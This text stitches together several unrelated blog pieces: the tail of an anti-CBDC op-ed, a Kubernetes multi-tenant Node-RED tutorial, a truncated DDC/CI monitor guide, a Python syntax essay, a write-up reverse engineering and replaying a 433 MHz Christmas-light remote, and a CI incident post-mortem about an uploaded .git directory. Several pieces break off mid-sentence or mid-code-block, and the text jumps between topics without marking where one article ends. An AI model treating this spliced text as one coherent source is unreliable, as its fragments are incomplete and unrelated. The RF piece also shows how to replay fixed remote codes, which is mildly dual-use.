monetary-driven economic growth. Negative interest rates are then potentially the most effective method of preventing hoarding by incentivizing account holders to spend their depreciating balances.</p><p>Currently, the central banks have to rely on commercial banks to pass the negative interest rates on their customers. Commercial banks instead are trying to convince the account holders to move their deposits from negative yielding accounts to interest yielding products and are consuming the negative rates on most of the outstanding cash balances.</p><p>With the central bank tokens being tied more tightly with their issuance authority, it would be much easier for the monetary interventionists to impose negative interest rates on all tokens in circulation. This would on a margin certainly increase the consumers’ and businesses’ propensity to spend and would also drive asset prices up as people would try to offload their cash savings. But to think of it as something beneficial is foolish. It was massive spending, record-low savings, and unsustainable asset valuations that led to the credit bubbles and crises of the past decades. To think that more of the same recipe would lead to a different, let alone better outcome is ludicrous.</p><h2>Financial Surveillance</h2><p>Third and final major implication of cash tokenization is the potential it creates for financial surveillance. The central banks are ostensibly introducing digital tokens to protect people’s privacy in the face of those reducing their anonymous cash usage. But the idea that any branch of government, let alone the one that imposes KYC/AML rules on the existing crypto token platforms, limits physical cash use to prevent tax avoidance, and uses financial surveillance to catch non-violent “criminals” cares about our privacy is laughable.</p><p>They’re not even hiding the fact, that tokenization of money would allow them to run what they call “data analytics”, but to think that they would not make the leap from aggregate analytics to individual data processing would be naive.</p><p>Of course, it’s not a coincidence, that China is the global leader in CBDCs. The surveillance potential of centralized tokenization is extremely attractive to the government that tries to keep tabs on every aspect of the lives of their underlings.</p><p>The proponents of the central banking tokens argue, that consumers need to be protected against targeted attacks on a country’s payment network. While such a risk exists - for example, if a country like Switzerland tried to provide anonymity for foreign depositors as it used to and as a result Visa and Mastercard would be pressured to shut down their payment networks for the country - if it materializes, the economy can always temporarily revert back to cash, supported by a vast network of local ATMs and bank branches.</p><p>If anything, the biggest attacks on the monetary exchange in the western world came from the governments themselves suspending or limiting cash withdrawals in times of liquidity crises as was the case in Cyprus or Greece, not to mention that those crises themselves were caused by central banking credit bubbles of the preceding periods.</p><p>Finally as was already mentioned, the argument about the protection of consumer privacy doesn’t pass the laugh test considering the history of continuous erosion of financial privacy by central banks and financial regulators.</p><p>In conclusion, the same characteristics for which people should oppose the transition to CDBCs give central banks the strongest reason to champion and implement them. And while the pretense of an investigation into the fiat money tokenization gives an impression of a debate on the topic, the reality is, there will be no debate and the digital currencies will go through and give central banks more control than they had before with all the disastrous consequences such control brings.</p></div></div></div></div></div></div></div>]]>

<p>Having built a working example of <a href="https://www.hardill.me.uk/wordpress/2020/10/01/multi-tenant-node-red/" data-type="post" data-id="3981">Multi Tenant Node-RED </a>using Docker I thought I’d have a look at how to do the same with Kubernetes as a Christmas project.</p>



<p>I started with installing the 64bit build of Ubuntu Server on a fresh Pi4 with 8gb RAM and then using snapd to install <a href="https://microk8s.io/">microk8s</a>. I had initially wanted to use the 64bit version of Raspberry Pi OS, but despite microk8s <a href="https://microk8s.io/docs">claiming</a> to work on any OS that support snapd, I found that containerd just kept crashing on Raspberry Pi OS.</p>



<p>Once installed I enabled the dns and ingress plugins, this got me a minimal viable single node Kubernetes setup working. <br></p>

<p>I also had to stand up a private docker registry to hold the containers I’ll be using. That was just a case of running <code>docker run -d -p 5000:5000 --name registry registry</code> on a local machine e.g <code>private.example.com</code> . This also means adding the URL for this to microk8s as described <a href="https://microk8s.io/docs/registry-private">here</a>.</p>



<p>Since Kubernetes is another container environment I can reuse most of the parts I previously created. The only bit that really needs to change is the Manager application as this has to interact with the environment to stand up and tear down containers.</p>



<h2>Architecture</h2>



<p>As before the central components are a MongoDB database and a management web app that stands up and tears down instances. The MongoDB instance holds all the flows and authentication details for each instance. I’ve deployed the database and web app as a single pod and exposed them both as services</p>

<p>This Deployment descriptor basically does all the heavy lifting. It sets up the mangment app, MongoDB and the private NPM registry.</p>



<p>It also binds 2 sets of secrets, the first holds holds the authentication details to interact with the Kubernetes API (the <code>~/.kube/config</code> file) and the <code>settings.js</code> for the management app. The second is the config for the Veraccio NPM registry.</p>



<p>I’m using the <a href="https://kubernetes.io/docs/concepts/storage/volumes/#hostpath">HostPath</a> volume provider to store the MongoDB and the Veraccio registry on the filesystem of the Pi, but for a production deployment I’d probably use the NFS provider or a Cloud Storage option like AWS S3.</p>



<h2>Manager</h2>



<p>This is mainly the same as the <a href="https://github.com/hardillb/multi-tenant-node-red-manager">docker version</a>, but I had to swap out <a href="https://npmjs.com/package/dockerode">dockerode</a> for <a href="https://www.npmjs.com/package/kubernetes-client">kubernetes-client</a>.</p>



<p>This library exposes the full kubernetes API allowing the creation/modification/destructions of all entities.</p>



<p>Standing up a new instance is a little more complicated as it’s now a multi step process.</p>



<ol><li>Create a Pod with the custom-node-red container</li><li>Create a Service based on that pod</li><li>Expose that service via the Ingress addon</li></ol>

<p>I also removed the Start/Stop buttons since stopping pods is not really a thing in Kubernetes.</p>



<p>All the code for this version of the app is on github <a href="https://github.com/hardillb/multi-tenant-node-red-k8s-manager">here</a>.</p>



<h2>Catalogue</h2>



<p>In the Docker-Compose version the custom node `catalogue.json` file is hosted by the management application and had to be manually updated each time a new or updated node was push to the repository. For this version I’ve stood up a separate container.</p>



<p>This container runs a small web app that has 2 endpoints.</p>



<ul><li><code>/catalogue.json</code> – which returns the current version of the catalogue</li><li><code>/update</code> – which is triggered by the the notify function of the Verdaccio private npm registry</li></ul>



<p>The registry has this snippet added to the end of the <code>config.yml</code></p>


<pre title="">notify:
  method: POST
  headers: [{'Content-Type': 'application/json'}]
  endpoint: http://catalogue/update
  content: '{"name": "{{name}}", "versions": "{{versions}}", "dist-tags": "{{dist-tags}}"}'
</pre>


<p>The code for this container can be found <a href="https://github.com/hardillb/node-red-private-catalogue-builder">here</a>. </p>



<h2>Deploying</h2>



<p>First clone the project from github</p>


<pre title="">$ github clone https://github.com/hardillb/multi-tenant-node-red-k8s.git
</pre>


<p>Then run the <code>setup.sh</code> script, passing in the base domain for instances and the host:port combination for the local container registry.</p>


<pre title="">$ ./setup.sh example.com private.example.com:5000
</pre>


<p>This will update some of the container locations in the deployment and build the secrets needed to access the Kubernetes API (reads the content of <code>~/.kube/config</code>)</p>



<p>With all the configuration files updated the containers need building and pushing to the local container registry.</p>


<pre title="">$ docker build ./manager -t private.example.com:5000/k8s-manager
$ docker push private.example.com:5000/k8s-manager
$ docker build ./catalogue -t private.example.com:5000/catalogue
$ docker push private.example.com:5000/catalogue
$ docker build ./custom-node-red -t private.example.com:5000/custom-node-red
$ docker push private.example.com:5000/custom-node-red
</pre>


<p>Finally trigger the actual deployment with <code>kubectl</code></p>


<pre title="">$ kubectl apply -f ./deployment
</pre>


<p>Once up and running the management app should be available on <code>http://manager.example.com</code>, the private npm registry on <code>http://registry.example.com</code> and an instance called “r1” would be on <code>http://r1.example.com</code>.</p>



<p>A wildcard DNS entry needs to be setup to point all <code>*.example.com</code> hosts to the Kubernetes clusters Ingress IP addresses.</p>



<p>As usual the whole solution can be found on github <a href="https://github.com/hardillb/multi-tenant-node-red-k8s">here</a>.</p>



<h2>What’s Next</h2>



<p>I need to work out how to set up Avahi CNAME entries for each deployment as I had working with both <a href="https://www.hardill.me.uk/wordpress/2020/09/22/nginx-proxy-avahi-helper/" data-type="post" data-id="4040">nginx</a> and <a href="https://www.hardill.me.uk/wordpress/2020/10/05/traefik-avahi-helper/" data-type="post" data-id="4107">traefik</a> so I can run it all nicely on my LAN without having to mess with <code>/etc/hosts</code> or the local DNS. This should be possible by using a <code>watch</code> call one the Kubernetes Ingress endpoint.</p>



<p>I also need to back port the new catalogue handling to the docker-compose version.</p>



<p>And finally I want to have a look at generating a Helm chart for all this to help get rid of needing the <code>setup.sh</code> script to modify the deployment YAML files.</p>



<p>p.s. If anybody is looking for somebody to do this sort of thing for them drop me a <a href="https://www.hardill.me.uk/wordpress/about/curriculum-vitae/" data-type="URL" data-id="https://www.hardill.me.uk/wordpress/about/curriculum-vitae/">line</a>.</p>

            <section>
                <div>
                    <!--kg-card-begin: markdown--><p>DDC/CI is a protocol for controlling monitor features like brightness, contrast, color temperature, input source, ... over the display cable (VGA, DVI, HDMI, Display port, ...).</p>
<p>It's a quite old protocol that is well supported across many different devices.</p>
<p>I'm currently using it to:</p>
<ul>
<li>Adjust brightness of my two monitors depending on how the room is lighted</li>
<li>Switch monitor inputs between the VM-dedicated graphics card and the host graphics card, replacing the need of a very expensive KVM switch that can WQHD @144Hz.</li>
</ul>

<h2 id="requiredpackages">Required packages</h2>
<p>You must install <code>ddcutil</code> package. The <a href="http://www.ddcutil.com/">official website</a> contains extensive information for troubleshooting.</p>
<h2 id="kernelmodules">Kernel modules</h2>
<p>Ddcutil connects to your screen over an I2C connection, and requires the <code>i2c-dev</code> kernel module to be loaded.</p>
<p>You can load the module at runtime using <code>sudo modprobe i2c-dev</code>.</p>
<p>To make it persistent across reboots, you need to add the module to <code>/etc/modules-load.d/i2c-dev.conf</code>:</p>
<pre><code>i2c-dev
</code></pre>
<p>Once the module is loaded, you should see some files in <code>/dev/i2c-*</code>.</p>
<h2 id="allowtheusertouseddc">Allow the user to use DDC</h2>
<p>By default the i2c dev files are owned by root, and can't be used by other users. One solution to allow your user to control DDC without using sudo is to add a custom udev rule:</p>
<p><code>/etc/udev/rules.d/45-ddcutil-i2c.rules</code></p>
<pre><code>KERNEL=="i2c-[0-9]*", GROUP="your-user", MODE="0660", PROGRAM="/usr/bin/ddcutil --bus=%n getvcp 0x10"
</code></pre>
<p>This rule automatically detects which i2c devices are DDC-capable, and allows members of the group "your-user" to control the file.</p>
<p>You can reload udev rules without rebooting by executing <code>sudo udevadm trigger</code></p>
<p>If you have multiple users, you can create a new group and add your user to the group:</p>
<pre><code>groupadd ddc
usermod -aG ddc $USER
</code></pre>
<h2 id="identifyyourmonitorinfo">Identify your monitor info</h2>
<h3 id="howtoaddressyourmonitor">How to address your monitor</h3>
<p>There are multiple ways to address your monitor, like display number (<code>--display</code>), model name (<code>--model</code>), serial number (<code>--sn</code>), i2c bus ID (<code>--bus</code>).</p>
<p>The bus ID method is way faster than the others, but may be unreliable if your hardware changes often.</p>
<pre><code>ddcutil detect

# Display 1
#    I2C bus:             /dev/i2c-0

            <p>The language has been literally 'evolving' since the version
that many of us have begun (maybe since the initial day, if you
are Guido). I'm not talking about any features in specific,
but rather the whole language. If you compare a code fragment
that you wrote 5 years ago, with the 'refactored' version that
you would write if it were today the difference is obvious. </p>
<p>We've seen a lot of new syntax popping into our lives, in just the

<p>This huge list contains some of the (major~) changes that have been implemented since 3.5, there
are also quite a few minor ones (like <code>_</code> separator for numbers, <code>1_000_00</code> or <a href="https://www.python.org/dev/peps/pep-0530/">PEP 530</a>
for async comprehensions or even a new one for 3.9 to extend the decorator syntax, <a href="https://www.python.org/dev/peps/pep-0614/">PEP 614</a>.)</p>
<p>Well, since we all refreshed our memories, let's try to imagine a world where these features don't exist. Imagine
not having access to f-strings, writing weird stuff to deal with your coroutines, or repeating yourself 2 times whenever
you want to read chunks from a file, writing utility functions to merge 2 mappings and more awful cases. Except for maybe
PEP 465 (I never needed it, probably because I don't do scientific programming. But from what I saw by looking at the examples
in the PEP, it is quite good for people who work with data on a daily basis.) every feature in that list literally changed and
actively affected how I write my Python code, right now.</p>
<p>Seems like syntactical additions sounds great, why don't we add everything to the language? Let's start with
adding regex literals, and then move forward to call pipeline operator, blah blah blah. If you are subscribed
to the Python-ideas, then get ready to see tons of different, redundant new syntax proposals (even I, probably
proposed a couple of very obscure and stupid ideas in the past). Though this brings me back to the point of,
whether we should stop the syntactical growth at all or not. </p>
<p>In the last 6 month, 3 different major syntax changes were proposed. I guess everyone is somewhat familiar
with the pattern matching PEPs, PEP 622 (PEP 634, PEP 635, PEP 636). Also, there is PEP 637 for allowing keyword arguments
on the subscript syntax <code>[x=y, z=q]</code> and PEP 638, for syntactic macros. I am not going to criticize any of these PEPs, but
I'd like to ask you to think about them. Think of how they could affect you in 5 years. Think about whether your
coding styles would change because of them, think about how good fit they are to the language, and most importantly think about
whether you 'ACTUALLY' need them. Is there any 'ESSENTIAL' case that would be much better when you pass keyword arguments through
slices instead of just making a call to some sort of <code>get()</code> function? Or can't we have syntactical customization without having an
official definition of it? Does the syntax for 'patterns' (described by PEP 634) is a good fit for the Python language?</p>
<p>There are a lot of blog posts, <a href="https://discuss.python.org/t/gauging-sentiment-on-pattern-matching/5770">poll</a>s and maybe
hundreds of emails out there related to these proposals. I won't expect anyone to read them all, but if you want to get a 
general idea just check some of them out.</p>
<p>Have to say that, I'm extremely overwhelmed by seeing this amount of change proposals every day, in various
places. No one is forcing me to read them, though it is just a burden that I am intentionally or unintentionally taking to see what are people looking for in the language that I (myself) probably will be stuck
with for the next decade. Trying to comprehend what people are aiming with making language so complex with
growing the syntax more and more every day.</p>
<p>Don't forget that adding syntax is much more serious than adding a functionality to the runtime. That syntax
will be the face of the language, and you won't be able to alter it even a little bit. We all saw what happened
when the syntax was changed in a backwards-incompatible manner, and no one wants to go through that again. This
is why I am just asking you to think about whether do you believe these would be good fits for the language, whether
they will worth to their imponderable cost. </p>
<p>This is just me, throwing a bunch of questions into the void. If you want to talk more about these, feel free to
send me an email (batuhan [at] python [dot] org) or reach me through twitter (open DM for all, @isidentical).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Over the course of the last year and a half, I’ve been doing some self-directed
learning on how radios work. I’ve gone from a very basic understanding of
wireless communications (there’s usually some sort of antenna, I guess?) all
the way through the process of learning about and implementing a set of
libraries to modulate and demodulate data using my now formidable stash of SDRs.
I’ve been implementing all of the RF processing code from first principals and
purely based on other primitives I’ve written myself to prove to myself that I
understand each concept before moving on.</p><p>I figured that there was a fun “capstone” to be done here - the blind reverse
engineering and implementation of the protocol my cheep Amazon power switch
uses to turn on and off my Christmas Tree. All the work described in this post
was done over the course of a few hours thanks to help during the demodulation
from <a href="https://github.com/tomberek/">Tom Bereknyei</a> and
<a href="https://blog.setec.io/">hlieberman</a>.</p><p>When I first got my switch, I checked it for any FCC markings in order to look
up the FCC filings to determine the operational frequency of the device, and
maybe some other information such as declared modulation or maybe even part
numbers and/or diagrams. However, beyond a few regulatory stickers, there were
no FCC ids or other distinguishing IDs on the device. Worse yet, it appeared to
be a whitelabeled version of another product, so searching Google for the
product name was very unhelpful.</p><p>Since operation of this device is unlicensed, I figured I’d start looking in
the ISM band. The most common band used that I’ve seen is the band starting
at <code>433.05MHz</code> up to <code>434.79MHz</code>. I fired up my trusty waterfall tuned to a
center frequency of <code>433.92MHz</code> (since it’s right in the middle of the band, and
it let me see far enough up and down the band to spot the remote) and pressed
a few buttons. Imagine my surprise when I realize the operational frequency of
this device is <code>433.920MHz</code>, exactly dead center. Weird, but lucky!</p><p><img src="https://kc3nwj.com/imgs/christmas/waterfall.gif" alt=""></p><p>After taking a capture, I started to look at understanding what the modulation
type of the signal was, and how I may go about demodulating it.
Using <a href="https://github.com/miek/inspectrum">inspectrum</a>, I was able to clearly
see the signal in the capture, and it immediately stuck out to my eye to be
encoded using OOK / ASK.</p><p><img src="https://kc3nwj.com/imgs/christmas/ook.png" alt=""></p><p>Next, I started to measure the smallest pulse, and see if I could infer the
symbols per second, and try to decode it by hand. These types of signals are
generally pretty easy to decode by eye.</p><p><a href="https://kc3nwj.com/imgs/christmas/inspectrum-christmas-lights-4-bit.png"><img src="https://kc3nwj.com/imgs/christmas/inspectrum-christmas-lights-4-strip.png" alt=""></a></p><p>This wound up giving me symbol rate of 2.2 Ksym/s, which is a lot faster than I
expected. While I was working by hand, <a href="https://github.com/tomberek/">Tom</a>
demodulated a few messages in Python, and noticed that if you grouped the bits
into groups of 4, you either had a <code>1000</code> or a <code>1110</code> – which caused me to
realize this was encoded using something I saw documented elsewhere, where the
0 is a “short” pulse, and a 1 is a “long” pulse, not unlike morse code, but
where each symbol takes up a fixed length of time (monospace morse code?).
Working on that assumption, I changed my inspectrum symbol width, and
demodulated a few more by hand. This wound up demodulating nicely (and the
preamble / clock sync could be represented as repeating <code>0</code>s, which is handy!)
and gave us a symbol rate of 612(ish) symbols per second – a lot closer to
what I was expecting.</p><p><a href="https://kc3nwj.com/imgs/christmas/inspectrum-christmas-lights.png"><img src="https://kc3nwj.com/imgs/christmas/inspectrum-christmas-lights-strip.png" alt=""></a></p><p>If we take the code for ‘on’ in the inspectrum capture above and demodulate
it by hand, we get <code>0000000000110101100100010</code> (treat a short pulse as a 0, and
a long pulse as a 1). If you’re interested in following along at home, click on
the inspectrum image, and write down the bits you see, and compare it to what
I have!</p><p>Right, so it looks like from what we can tell so far that the packet looks
something like this:</p><p>Next, I took a capture of all the button presses and demodulated them by hand,
and put them into a table to try and understand the format of the messages:</p><table><thead><tr><td>Button</td><td>Demod'd Bits</td></tr></thead><tbody><tr><td>On</td><td>0000000000110101100100010</td></tr><tr><td>Off</td><td>00000000001101011001010000</td></tr><tr><td>Dim Up</td><td>0000000000110101100110100</td></tr><tr><td>Dim Down</td><td>0000000000110101100100100</td></tr><tr><td>Timer 1h</td><td>0000000000110101100110010</td></tr><tr><td>Timer 2h</td><td>0000000000110101100100110</td></tr><tr><td>Timer 4h</td><td>0000000000110101100100000</td></tr><tr><td>Dim 100%</td><td>0000000000110101000101010</td></tr><tr><td>Dim 75%</td><td>00000000001101010001001100</td></tr><tr><td>Dim 50%</td><td>00000000001101010001001000</td></tr><tr><td>Dim 25%</td><td>0000000000110101000100000</td></tr></tbody></table><p>Great! So, this is enough to attempt to control the tree with, I think – so I
wrote a simple modulator. My approach was to use the fact that I can break down
a single symbol into 4 “sub-symbol” components – which is to say, go back to
representing a <code>1</code> as <code>1110</code>, and a <code>0</code> as <code>1000</code>. This let me allocate IQ
space for the symbol, break the bit into 4 symbols, and if that symbol is 1,
write out values from a carrier wave (<code>cos</code> in the <code>real</code> values, and <code>sin</code> in
the <code>imaginary</code> values) to the buffer. Now that I can go from bits to IQ data,
I can transmit that IQ data using my PlutoSDR or HackRF and try and control my
tree. I gave it a try, and the tree blinked off!</p><p>🎉🎊 Success! 🎊🎉</p><p>But wait – that’s not enough for me – I know I can’t just demodulate bits and
try and replay the bits forever – there’s stuff like addresses and keys and
stuff, and I want to get a second one of these working. Let’s take a look at
the bits to see if we spot anything fun &amp; interesting.</p><p>At first glance, a few things jumped out at me as being… weird? First is
that the preamble is 10 bits long (fine, let’s move along - maybe it
just needs 8 in a row and there’s two to ensure clocks sync?). Next is that
the messages are not all the same length. I double (and triple!) checked
the messages, and it’s true, the messages are not all the same length. Adding
an extra bit at the end didn’t break anything, but I wonder if that’s just due
to the implementation rather than the protocol.</p><p>But, good news, it looks like we have a stable prefix to the messages from the
remote – must be my device’s address! The stable 6 bits that jump out right
away are <code>110101</code>. Something seems weird, though, 6 bits is a bit awkward, even
for a bit limited embedded device. Why 6? But hey, wait, we had 10 bits in the
preamble, what if we have an 8 bit address – meaning my device is <code>00110101</code>,
and the preamble is 8 <code>0</code> symbols! Those are numbers that someone working on
an 8 bit aligned platform would pick! To test this, I added a <code>0</code> to the
preamble to see if the message starts at the first <code>1</code>, or if it requires all
the bits to be fully decoded, and lo and behold, the tree did not turn on or
off. This would seem to me to confirm that the 0s are part of the address,
and I can assume we have two 8 bit aligned bytes in the prefix of the message.</p><div><p>preamble / sync</p><p>address</p><p>stuff</p></div><p>Now, when we go through the 9-10 bits of “stuff”, we see all sorts of weird
bits floating all over the place. The first 4 bits look like it’s either
<code>1001</code> or <code>0001</code>, but other than that, there’s a lot of chaos. This is where
things get really squishy. I needed more information to try and figure this out,
but no matter how many times I sent a command it was always the same bits (so,
no counters), and things feel very opaque still.</p><p>The only way I was going to make any progress is to get another switch and see
how the messages from the remote change. Off to Amazon I went, and ordered
another switch from the same page, and eagerly waited its arrival.</p><h2 id="switch-2">Switch #2</h2><p>The second switch showed up, and I hurriedly unboxed the kit, put batteries
into the remote, and fired up my SDR to take a capture. After I captured the
first button (“Off”), my heart sunk as I saw my lights connected to
Switch #1 flicker off. Apparently the new switch and the old switch have the
same exact address. To be sure, I demodulated the messages as before, and
came out with the exact same bit pattern. This is a setback and letdown – I
was hoping to independently control my switches, but it also means I got no
additional information about the address or button format.</p><p>The upside to all of this, though, is that because the switches are controlled
by either remote, I only needed one remote, so why not pull it apart and see if
I can figure out what components it’s using to transmit, and find any
datasheets I can. The PCB was super simple, and I wound up finding a “WL116SC”
IC on the PCB.</p><p><img src="https://kc3nwj.com/imgs/christmas/remote-teardown.png" alt=""></p><p>After some googling, I found a single lone
<a href="https://web.archive.org/web/20201023121143/https://datasheet.lcsc.com/szlcsc/2007311538_WL-WL116AC-1527_C708721.pdf">datasheet</a>,
entirely in Chinese. Thankfully, Google Translate seems to have worked well
enough on technical words, and I was able to put together at least a little bit
of understanding based on the documentation that was made available. I took a
few screenshots below - I put the google translated text above the hanzi. From
that sheet, we can see we got the basics of the “1” and “0” symbol encoding
right (I was halfway expecting the bits to be flipped), and a huge find by way
of a description of the bits in the message!</p><p><img src="https://kc3nwj.com/imgs/christmas/wl116sc-pulse-width.png" alt=""></p><p>It’s a bummer that we missed the clock sync / preamble pulse before the data
message, but that’s OK somehow. It also turns out that 8 or 10 bit series of of
“0"s wasn’t clock sync at all - it was part of the address! Since it also turns
out that all devices made by this manufacturer have the hardcoded address of
<code>[]byte{0x00, 0x35}</code>, that means that the vast majority of bits sent are always
going to be the same for any button press on any remote made by this vendor.
Seems like a waste of bits to me, but hey, what do I know.</p><p>Additionally, this also tells us the trailing zeros are not part of the data
encoding scheme, which is progress!</p><p>Now, working on the assumptions validated by the datasheet, here’s the updated
list of scancodes we’ve found:</p><table><thead><tr><td>Button</td><td>Scancode Bits</td><td>Integer</td></tr></thead><tbody><tr><td>On</td><td>10010001</td><td>145 / 0x91</td></tr><tr><td>Off</td><td>10010100</td><td>148 / 0x94</td></tr><tr><td>Dim Up</td><td>10011010</td><td>154 / 0x9A</td></tr><tr><td>Dim Down</td><td>10010010</td><td>146 / 0x92</td></tr><tr><td>Timer 1h</td><td>10011001</td><td>154 / 0x99</td></tr><tr><td>Timer 2h</td><td>10010011</td><td>147 / 0x93</td></tr><tr><td>Timer 4h</td><td>10010000</td><td>144 / 0x90</td></tr><tr><td>Dim 100%</td><td>00010101</td><td>21 / 0x15</td></tr><tr><td>Dim 75%</td><td>00010011</td><td>19 / 0x13</td></tr><tr><td>Dim 50%</td><td>00010010</td><td>18 / 0x12</td></tr><tr><td>Dim 25%</td><td>00010000</td><td>16 / 0x10</td></tr></tbody></table><p>Interestingly, I think the “Dim” keys may have a confirmation that we have
a good demod – the codes on the bottom are missing the most significant
bit, and when I look back at the scancode table in the datasheet, they make an
interesting pattern – the bottom two rows, right and left side values match
up! If you …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>Yesterday, this site went down for about four hours. Complaints started rolling
in from my millions of ardent followers, spurring me into action. Join
me as I deconstruct what went wrong, how I fixed it, and how I tried to
prevent the problem from occurring again.</p>

<p>This site is built with <a href="https://gohugo.io/">Hugo</a>, a static site generator
written in Go.
It<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> uses a slightly modified version of the
<a href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme by
<a href="https://github.com/LordMathis">Matúš Námešný</a>.
It’s deployed automatically using GitLab’s CI/CD (Continuous
Integration/Continuous Deployment) service. Every time I push a commit to the
remote repository, a server runs a deployment script that I wrote. The script
generates the site and then uploads it to my web host.</p>
<p>Since I got the flow working, I didn’t have any problems until now.</p>

<p>Yesterday at 8:22pm, I pushed a benign commit to the remote repository.
The commit in question simply removed a draft of a post I had been writing
and decided not to publish. As with all pushed commits, this triggered a
build and push of the site.</p>
<p>Hours later, I went to my site for something and noticed something strange:
the homepage was 404ing. So were all the other pages that should have
been there. So I looked through my CI logs and found that:</p>
<ol>
<li>Hugo had failed to build my site</li>
<li>My script attempted to upload anyway</li>
<li><em>It uploaded my <code>.git</code> directory</em></li>
</ol>
<p>The first one is okay; failures happen even though ideally they wouldn’t.
The second one is worrying: Why would that happen?
The third one had the potential to be disastrous.</p>
<h2 id="the-consequences">The consequences</h2>
<p>Luckily for me, there were few consequences. To my knowledge, my site gets very
few visitors. Also, it’s not like my site runs important tools or services for me,
since it’s a static site.</p>
<p>However, there is one thing that could have been very bad…</p>
<h2 id="the-potential-consequences">The potential consequences</h2>
<p>As I mentioned above, for those four hours, my entire <code>.git</code> directory for the
repository that holds this site was available for all to browse at
<a href="https://reeshill.net/.git/">https://reeshill.net/.git/</a>. This of course means that not only was the current
state of the repository publicly accessible, all past version history was as well.</p>
<p>My CI script needs to authenticate with my web host to upload the generated site.
It does this with an app-specific password. For the script, this password needs
to be stored somewhere the CI server will have access to.
The naïve solution would be to hard-code the password into the script that runs
on CI. If I had done this, <em>even if I had later removed it</em>, the password would
exist in the history of the repository. Had this been the case, an attacker
would have had plenty of time to discover this in the version history and upload
malicious content to my web host, such as a Javascript cryptocurrency miner.</p>
<p>Fortunately, Past Me was smart enough not to put any secrets in version control.
The password is actually stored by GitLab and given to the CI server as an
environment variable. I trust GitLab a lot more than I trust myself to keep my
secrets safe.</p>

<p>Two big things went wrong at once to cause this failure. If either of them had
gone right, the damage would have been either nonexistent or extremely minimal.
But because they both managed to fail at once, the consequences were greater.</p>

<p>The immediate cause of failure was that Hugo installation started failing.
I was using a Docker image of Alpine Linux that contained
<a href="https://en.wikipedia.org/wiki/Lftp"><code>lftp</code></a>, which I use as an FTP client.
However, that image did not contain Hugo, and when I set it up I was afraid to
mess with it, so CI would install Hugo from the network every time it was run.
Something must have changed in the Alpine repositories, because suddenly
running <code>hugo</code> resulted in the error</p>
<pre><code>Error relocating /usr/bin/hugo: _ZNSt7__cxx1118basic_stringstreamIcSt11char_traitsIcESaIcEEC1Ev: symbol not found
</code></pre>
<p>This should have been no big deal. The CI should have failed and then I would
deal with fixing the Hugo installation. But because of problem #2, the whole
situation spiraled out of control.</p>
<h2 id="the-real-cause">The real cause</h2>
<p>When I wrote the script that builds and uploads the site in April 2018, I did not
yet understand how shell scripting works. Crucially, I didn’t understand exit
codes. When you run a shell command, part of the result is an exit code: a
number which is <code>0</code> if the command was successful and some other value if it
failed.</p>
<p>By default, a script that contains a sequence of commands will run all of those
commands in order, even if one or more command fails. For an example, see the
following script:</p>
<div><pre><code data-lang="shell"><span>#!/bin/sh
</span><span></span>
<span>echo</span> <span>'Started the script!'</span>
ls directory-that-does-not-exist
<span>echo</span> <span>'The exit code of the previous command was'</span> <span>"</span><span>$?</span><span>"</span>
</code></pre></div><p>The second command (the <code>ls</code>) will fail if the named directory does not exist.
But the script will keep running. Here’s the output from running the above script:</p>
<pre><code>$ ./steamroll.sh 
Started the script!
ls: directory-that-does-not-exist: No such file or directory
The exit code of the previous command was 1
</code></pre><p>The second <code>echo</code> runs despite the previous command failing with a nonzero
exit code.</p>
<p>That’s kind of scary! In most programming languages, if the program encounters
an error, it will crash or display some sort of exception that halts execution.
Because the default shell behavior is to keep going regardless of failure status,
my script failed to generate the site but proceeded to the next step anyway.</p>
<p>In my case, when <code>lftp</code> was unable to upload the directory it was supposed to
upload (which was a child of the current directory), it instead uploaded the
current directory, which was the repository root. That looked like this:</p>
<pre><code>/builds/jarhill0/homepage/public: No such file or directory
Transferring file `README.md'
Transferring file `ci-upload.sh'
Transferring file `config.toml'
Making directory `.git'
Transferring file `.git/FETCH_HEAD'
Transferring file `.git/HEAD'
[etc.]
</code></pre><p>Ultimately, the failure of my script to halt once a command failed was what led
to the incident. Small failures should be expected, but when they happen there
should be a clear indication of failure and the process should not continue.</p>

<p>There were essentially three problems I had to fix:</p>
<ol>
<li>My site was down</li>
<li>My builds weren’t failing</li>
<li>My builds <em>were</em> failing</li>
</ol>
<h2 id="the-quick-fix">The quick fix</h2>
<p>Since I was still able to build my website on my local machine, I did that and
uploaded it. That gave me time to fix the underlying problems.</p>
<h2 id="the-process-fix">The process fix</h2>
<p>If one of my builds didn’t succeed, that should be reflected in the script’s
exit status.</p>
<p>It took six characters to fix my script:</p>
<p>Adding this line towards the top of the script does the following, according
to the <a href="http://www.linuxcommand.org/lc3_man_pages/seth.html">man page for <code>set</code></a>:</p>
<pre><code>-e  Exit immediately if a command exits with a non-zero status.
</code></pre><p>That’s <em>exactly</em> what we want! As soon as a command fails, the script should
fail. With this option set, any failures that may occur down the road will
stop the CI job with a failure status. Perfect!</p>
<p>Here’s what it looks like in our test script from above:</p>
<div><pre><code data-lang="shell"><span>#!/bin/sh
</span><span></span>
<span>set</span> -e

<span>echo</span> <span>'Started the script!'</span>
ls directory-that-does-not-exist
<span>echo</span> <span>'The exit code of the previous command was'</span> <span>"</span><span>$?</span><span>"</span>
</code></pre></div><p>And the output:</p>
<pre><code>$ ./stopsign.sh 
Started the script!
ls: directory-that-does-not-exist: No such file or directory
</code></pre><p>It stopped once there was an error. Sweet!</p>
<h2 id="the-build-fix">The build fix</h2>
<p>Now that my build status was properly reflecting the failure that was occuring,
I needed to make the builds succeed.</p>
<p>A quick search didn’t help me figure out what was causing the mis-installation
of Hugo, and I didn’t feel like digging in further because I knew that I was
misusing Docker.
The whole point of Docker is that it leads to reproducible states.
Instead of installing a new dependency on top of my Docker image every time,
I should put all necessary
dependencies in the image from the beginning. So I bit the bullet and figured
out how to make (actually, adapt) a Dockerfile. Now, all of my CI builds will
start with Hugo and <code>lftp</code> already installed.
It didn’t take all that long, and now I have removed one more source of failure!</p>

<p>Some failures, like the bug in my script fixed by <code>set -e</code>, can lie dormant for
quite a while
(in my case, a year and a half) before being exposed when something else fails.
When something works reliably for a while, we don’t often think to go back
and check that it works as we expect it does. And it’s very difficult to get
everything right the first time.</p>
<p>I’m glad that this failure led to an improvement in the way I use Docker images.
And I’m glad that the script has been fixed, because now any other failures
will be caught and I will be alerted. Above all, I’m glad that things were
